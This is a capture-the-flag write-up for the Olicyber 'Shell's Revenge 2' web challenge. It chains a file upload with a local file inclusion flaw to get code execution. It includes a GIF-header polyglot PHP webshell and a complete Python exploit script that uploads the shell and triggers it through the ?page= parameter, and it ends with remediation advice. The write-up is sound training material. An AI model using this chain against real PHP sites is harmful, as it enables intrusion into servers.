---
title: "Shell's Revenge 2 — GIF Polyglot Webshell via LFI Include"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "file-upload", "php", "lfi", "rce"]
difficulty: "intermediate"
summary: "Upload a GIF polyglot containing a PHP shell, then trigger its execution through a local file inclusion vulnerable ?page= parameter that includes the uploaded file path."
---

## The Challenge

The application has two vulnerabilities that chain together: a file upload that stores files but does not execute them by URL, and a `?page=` parameter that includes arbitrary local files with `include()`. Neither is enough alone — together they give RCE.

## Approach

1. Upload `GIF89a;\n<?php echo system("/getflag"); ?>` as a `.php` file (or with any accepted extension). The file is saved at a known path such as `uploads/HASH/filename`.
2. Use the LFI gadget: `?page=uploads/HASH/filename` makes PHP `include()` the file, which triggers execution of the embedded shell.

The response from the LFI request contains the output of `/getflag`.

## Solution

```php
GIF89a;
<?php echo system("/getflag"); ?>
```

```python
#!/usr/bin/env python3
import requests, re
from bs4 import BeautifulSoup

site = "http://shells-revenge-2.challs.olicyber.it/"

with open("shell2.php", "wb") as f:
    f.write(b'GIF89a;\n<?php echo system("/getflag"); ?>')

with open("shell2.php", "rb") as f:
    r = requests.post(site + "upload.php", files={"file": ("shell2.php", f, "image/gif")})

# Extract upload path from response
soup = BeautifulSoup(r.text, "html.parser")
upload_path = re.search(r"uploads/[a-f0-9]+/shell2\.php", r.text).group(0)

r2 = requests.get(site + f"?page={upload_path}")
print(r2.text)
```

The LFI path `uploads/HASH/shell2.php` tells PHP to `include()` it, executing the shell code. `/getflag` is the flag-printing binary on this challenge instance.

## What I Learned

File upload + LFI is a classic server-side exploit chain. Even if uploaded files are not directly served through a PHP-executing route, an LFI allows including them into the PHP runtime. Fix: store uploads outside the web root, sanitise the `page` parameter to a whitelist, and never allow user-controlled paths in `include()`.
